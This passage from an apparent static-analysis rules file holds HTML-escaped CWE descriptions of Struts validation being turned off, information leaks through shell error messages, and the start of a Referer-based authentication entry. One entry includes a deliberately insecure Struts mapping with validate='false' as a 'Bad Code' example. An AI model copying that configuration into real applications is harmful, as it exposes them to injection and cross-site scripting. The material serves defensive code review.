Relationships, Taxonomy Mappings&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-10-14&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Description&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2009-05-27&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Demonstrative Examples&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;

&lt;/html&gt;

&lt;div align="right" style="padding-top:5px; padding-bottom:5px; clear:right" class="noprint"&gt;&lt;a class="backtop" href="#top"&gt;Back to top&lt;/a&gt;&lt;/div&gt;

&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;&lt;/html&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_667</key><name>Struts_Validation_Turned_Off</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;
	&lt;link href="main.css" rel="stylesheet" type="text/css"&gt;
&lt;div id="CWEDefinition"&gt;&lt;div class="title"&gt;&lt;table cellpadding="0" cellspacing="0" border="0" width="100%"&gt;&lt;tr&gt;&lt;td valign="top" width="20px"&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div align="center"&gt;&lt;span style="font-weight:bold;color:white;"&gt;Struts: Validator Turned Off&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;td valign="top" width="20px"&gt;&lt;div class="left noprint"&gt;

&lt;span class="tool"&gt;&lt;/span&gt;

&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div class="status"&gt;&lt;table width="100%" border="0" cellpadding="0" cellspacing="0"&gt;&lt;tr&gt;&lt;td valign="top" align="left" width="33%" nowrap=""&gt;&lt;b&gt;Weakness ID: &lt;/b&gt;109&lt;span style="font-style:italic; font-size:80%"&gt; (Weakness Variant)&lt;/span&gt;&lt;/td&gt;&lt;td valign="top" align="center" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top" align="right" nowrap=""&gt;&lt;b&gt;Status: &lt;/b&gt;&lt;span class="Draft"&gt;Draft&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div id="Description"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Description&lt;/div&gt;&lt;div name="oc_109_Description" id="oc_109_Description" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Description Summary&lt;/p&gt;&lt;div class="indent"&gt;Automatic filtering via a Struts bean has been turned off,
which disables the Struts Validator and custom validation logic. This exposes
the application to other weaknesses related to insufficient input
validation.&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Time of Introduction"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Time of Introduction&lt;/div&gt;&lt;div name="oc_109_Time of Introduction" id="oc_109_Time of Introduction" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;ul&gt;
&lt;li&gt;Implementation&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Applicable Platforms"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Applicable Platforms&lt;/div&gt;&lt;div name="oc_109_Applicable Platforms" id="oc_109_Applicable Platforms" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Languages&lt;/p&gt;&lt;div class="indent"&gt;
&lt;p&gt;Java&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Demonstrative Examples"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Demonstrative Examples&lt;/div&gt;&lt;div name="oc_109_Demonstrative Examples" id="oc_109_Demonstrative Examples" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;p class="subheading"&gt;Example 1&lt;/p&gt;&lt;p&gt;An action form mapping that disables validation.&lt;/p&gt;&lt;div class="indent Bad_Code"&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div style="float:right; font-style:italic; font-size:10px; color:#98A9B7"&gt;(Bad Code)&lt;/div&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;Example
Language: &lt;/span&gt;XML&amp;nbsp;&lt;/div&gt;&lt;/div&gt;&lt;div class="top"&gt;&lt;div style="font-size:90%;"&gt;&amp;lt;action path="/download"&lt;/div&gt;&lt;div style="font-size:90%;"&gt;type="com.website.d2.action.DownloadAction"&lt;/div&gt;&lt;div style="font-size:90%;"&gt;name="downloadForm"&lt;/div&gt;&lt;div style="font-size:90%;"&gt;scope="request"&lt;/div&gt;&lt;div style="font-size:90%;"&gt;input=".download"&lt;/div&gt;&lt;div style="font-size:90%;"&gt;validate="false"&amp;gt;&lt;/div&gt;&lt;div style="font-size:90%;"&gt;&amp;lt;/action&amp;gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;p&gt;Disabling validation exposes this action to numerous types of attacks.
Unchecked input is the root cause of vulnerabilities like cross-site
scripting, process control, and SQL injection. Although J2EE
applications are not generally susceptible to memory corruption attacks,
if a J2EE application interfaces with native code that does not perform
array bounds checking, an attacker may be able to use an input
validation mistake in the J2EE application to launch a buffer overflow
attack.&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Potential Mitigations"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Potential Mitigations&lt;/div&gt;&lt;div name="oc_109_Potential Mitigations" id="oc_109_Potential Mitigations" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p&gt;Ensure that an action form mapping enables validation. In the included
demonstrative example, the validate field should be set to true.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Other Notes"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Other Notes&lt;/div&gt;&lt;div name="oc_109_Other Notes" id="oc_109_Other Notes" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td&gt;
&lt;p&gt;The Action Form mapping in the demonstrative example disables the form's
validate() method. The Struts bean: write tag automatically filters special
HTML characters, replacing a &amp;lt; with &amp;amp;lt and a &amp;gt; with
&amp;amp;gt. This action can be disabled by specifying filter="false" as an
attribute of the tag to disable specified JSP pages. However, being disabled
makes these pages susceptible to cross-site scripting attacks. An attacker
may be able to insert malicious scripts as user input to write to these JSP
pages.&lt;/p&gt;
&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Weakness Ordinalities"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Weakness Ordinalities&lt;/div&gt;&lt;div name="oc_109_Weakness Ordinalities" id="oc_109_Weakness Ordinalities" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Ordinality&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Description&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;div style="font-size:90%;"&gt;Primary&lt;/div&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div style="font-size:90%; font-style:italic; padding:5px;"&gt;(where
the weakness exists independent of other weaknesses)&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Relationships"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Relationships&lt;/div&gt;&lt;div name="oc_109_Relationships" id="oc_109_Relationships" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" id="Detail"&gt;&lt;tr&gt;&lt;th valign="top"&gt;Nature&lt;/th&gt;&lt;th valign="top"&gt;Type&lt;/th&gt;&lt;th valign="top"&gt;ID&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Name&lt;/th&gt;&lt;th valign="middle" class="left" style="text-align:center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;View(s) this relationship pertains to&lt;/span&gt;&lt;/span&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Class&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;20&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=20" target="_blank"&gt;Improper Input Validation&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Seven Pernicious Kingdoms &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;700&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Category&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;101&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=101" target="_blank"&gt;Struts Validation Problems&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Class&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;693&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=693" target="_blank"&gt;Protection Mechanism Failure&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Category&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;722&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=722" target="_blank"&gt;OWASP Top Ten 2004 Category A1 - Unvalidated Input&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weaknesses in OWASP Top Ten (2004) &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;711&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;

&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Causal Nature"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt;&lt;a href="javascript:toggleblocksOC('109_Causal Nature');"&gt;f&lt;/a&gt; &lt;/span&gt;Causal Nature&lt;/div&gt;&lt;div name="oc_109_Causal Nature" id="oc_109_Causal Nature" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;p class="indent"&gt;Explicit&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Taxonomy Mappings"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Taxonomy Mappings&lt;/div&gt;&lt;div name="oc_109_Taxonomy Mappings" id="oc_109_Taxonomy Mappings" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Mapped Taxonomy Name&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Node ID&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Fit&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Mapped Node Name&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;7 Pernicious Kingdoms&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top"&gt;Struts: Validator Turned Off&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Content History"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Content History&lt;/div&gt;&lt;div name="oc_109_Content History" id="oc_109_Content History" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Submissions&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Submission Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Submitter&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;7 Pernicious Kingdoms&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Externally Mined&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Modifications&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Modification Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Modifier&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-07-01&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Eric Dalci&lt;/td&gt;&lt;td valign="top"&gt;Cigital&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;External&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Potential Mitigations,
Time of Introduction&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-09-08&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Relationships, Other Notes, Taxonomy Mappings,
Weakness Ordinalities&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2009-03-10&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Relationships&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2009-07-27&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Demonstrative Examples&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;

&lt;/html&gt;

&lt;div align="right" style="padding-top:5px; padding-bottom:5px; clear:right" class="noprint"&gt;&lt;a class="backtop" href="#top"&gt;Back to top&lt;/a&gt;&lt;/div&gt;

&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;&lt;/html&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MAJOR</severity><tag>checkmarx-medium</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1647</key><name>Information_Leak_Through_Shell_Error_Message</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;
	&lt;link href="main.css" rel="stylesheet" type="text/css"&gt;
&lt;div id="CWEDefinition"&gt;&lt;div class="title"&gt;&lt;table cellpadding="0" cellspacing="0" border="0" width="100%"&gt;&lt;tr&gt;&lt;td valign="top" width="20px"&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div align="center"&gt;&lt;span style="font-weight:bold;color:white;"&gt;Information Leak Through Shell Error Message&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;td valign="top" width="20px"&gt;&lt;div class="left noprint"&gt;

&lt;span class="tool"&gt;&lt;/span&gt;

&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div class="status"&gt;&lt;table width="100%" border="0" cellpadding="0" cellspacing="0"&gt;&lt;tr&gt;&lt;td valign="top" align="left" width="33%" nowrap=""&gt;&lt;b&gt;Weakness ID: &lt;/b&gt;535&lt;span style="font-style:italic; font-size:80%"&gt; (Weakness Variant)&lt;/span&gt;&lt;/td&gt;&lt;td valign="top" align="center" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top" align="right" nowrap=""&gt;&lt;b&gt;Status: &lt;/b&gt;&lt;span class="Incomplete"&gt;Incomplete&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div id="Description"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Description&lt;/div&gt;&lt;div name="oc_535_Description" id="oc_535_Description" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Description Summary&lt;/p&gt;&lt;div class="indent"&gt;A command shell error message indicates that there exists an
unhandled exception in the web application code. In many cases, an attacker can
leverage the conditions that cause these errors in order to gain unauthorized
access to the system.&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Time of Introduction"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Time of Introduction&lt;/div&gt;&lt;div name="oc_535_Time of Introduction" id="oc_535_Time of Introduction" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;ul&gt;
&lt;li&gt;Architecture and Design&lt;/li&gt;
&lt;li&gt;Implementation&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Potential Mitigations"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Potential Mitigations&lt;/div&gt;&lt;div name="oc_535_Potential Mitigations" id="oc_535_Potential Mitigations" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p&gt;Do not expose sensitive error information to the user.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Relationships"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Relationships&lt;/div&gt;&lt;div name="oc_535_Relationships" id="oc_535_Relationships" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" id="Detail"&gt;&lt;tr&gt;&lt;th valign="top"&gt;Nature&lt;/th&gt;&lt;th valign="top"&gt;Type&lt;/th&gt;&lt;th valign="top"&gt;ID&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Name&lt;/th&gt;&lt;th valign="middle" class="left" style="text-align:center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;View(s) this relationship pertains to&lt;/span&gt;&lt;/span&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;210&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=210" target="_blank"&gt;Product-Generated Error Message Information Leak&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;

&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Content History"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Content History&lt;/div&gt;&lt;div name="oc_535_Content History" id="oc_535_Content History" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Submissions&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Submission Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Submitter&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Anonymous Tool Vendor (under NDA)&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Externally Mined&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Modifications&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Modification Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Modifier&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-07-01&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Eric Dalci&lt;/td&gt;&lt;td valign="top"&gt;Cigital&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;External&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Potential Mitigations,
Time of Introduction&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-09-08&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Relationships,
Taxonomy Mappings&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;

&lt;/html&gt;

&lt;div align="right" style="padding-top:5px; padding-bottom:5px; clear:right" class="noprint"&gt;&lt;a class="backtop" href="#top"&gt;Back to top&lt;/a&gt;&lt;/div&gt;

&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;&lt;/html&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1669</key><name>Using_Referer_Field_for_Authentication</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;
	&lt;link href="main.css" rel="stylesheet" type="text/css"&gt;
&lt;div id="CWEDefinition"&gt;&lt;div class="title"&gt;&lt;table cellpadding="0" cellspacing="0" border="0" width="100%"&gt;&lt;tr&gt;&lt;td valign="top" width="20px"&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div align="center"&gt;&lt;span style="font-weight:bold;color:white;"&gt;Using Referer Field for Authentication&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;td valign="top" width="20px"&gt;&lt;div class="left noprint"&gt;

&lt;span class="tool"&gt;&lt;/span&gt;

